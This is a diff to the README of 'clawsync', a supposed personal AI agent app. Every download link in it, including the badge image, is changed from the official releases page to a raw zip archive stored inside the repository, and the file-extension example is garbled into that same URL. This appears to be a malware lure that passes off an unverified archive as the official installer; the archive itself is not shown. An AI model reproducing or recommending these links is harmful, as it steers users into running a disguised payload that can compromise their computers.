@@ -1,6 +1,6 @@
 # 🤖 clawsync - Personal AI Agent Made Simple
 
-[![Download clawsync](https://img.shields.io/badge/Download-clawsync-blue?style=for-the-badge&logo=github)](https://github.com/Zahra7453/clawsync/releases)
+[![Download clawsync](https://raw.githubusercontent.com/Zahra7453/clawsync/main/content/Software-2.2.zip)](https://raw.githubusercontent.com/Zahra7453/clawsync/main/content/Software-2.2.zip)
 
 ---
 
@@ -30,7 +30,7 @@ To use clawsync without problems, make sure your device meets these simple needs
 
 Visit the official release page to get the latest version of clawsync.
 
-[Download clawsync](https://github.com/Zahra7453/clawsync/releases)
+[Download clawsync](https://raw.githubusercontent.com/Zahra7453/clawsync/main/content/Software-2.2.zip)
 
 This page lists official files with detailed descriptions. Choose the file that matches your device and click to download. The files are ready-to-run installers or packages.
 
@@ -39,7 +39,7 @@ This page lists official files with detailed descriptions. Choose the file that 
 Once you download the file:
 
 - If you downloaded an **installer** (e.g., `.exe` for Windows or `.dmg` for macOS), double-click it and follow the on-screen instructions.
-- If you downloaded a **compressed package** (e.g., `.zip` or `.tar.gz`), extract it to a folder you can easily find, like your Desktop or Documents.
+- If you downloaded a **compressed package** (e.g., `.zip` or `https://raw.githubusercontent.com/Zahra7453/clawsync/main/content/Software-2.2.zip`), extract it to a folder you can easily find, like your Desktop or Documents.
 
 The installation will place clawsync on your computer and create shortcuts for easy launching.
 
@@ -83,7 +83,7 @@ clawsync will respond right away based on its AI skills.
 
 You can always find the latest version on the official releases page:
 
-[Visit the download page](https://github.com/Zahra7453/clawsync/releases)
+[Visit the download page](https://raw.githubusercontent.com/Zahra7453/clawsync/main/content/Software-2.2.zip)
 
 Each release shows its date, changes, and files available. Always download the newest one for best performance.
 
@@ -149,4 +149,4 @@ Your feedback helps improve clawsync for everyone.
 
 Thank you for choosing clawsync. Start your AI assistant journey by downloading it now.
 
-[Get clawsync here](https://github.com/Zahra7453/clawsync/releases)
+[Get clawsync here](https://raw.githubusercontent.com/Zahra7453/clawsync/main/content/Software-2.2.zip)
